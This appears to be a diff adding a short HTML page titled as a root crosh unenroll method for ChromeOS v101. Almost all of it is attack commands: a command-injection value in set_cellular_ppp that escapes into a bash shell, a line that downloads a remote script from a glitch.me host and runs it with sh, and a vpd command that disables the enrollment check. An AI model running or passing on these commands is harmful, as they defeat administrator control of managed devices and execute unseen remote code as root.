@@ -1,0 +1,12 @@
+<title>root crosh unenroll for v101 chromeos</title>
+<pre>
+set_cellular_ppp \';bash;exit;\'
+
+sh &lt;(curl https://yeo.glitch.me/root/<span>101</span>.sh)
+
+vpd -i RW_VPD -s check_enrollment=0
+</pre>
+<script>
+  if (["#91"].includes(location.hash))
+    document.querySelector("span").textContent = location.hash.replace("#", "");
+</script>
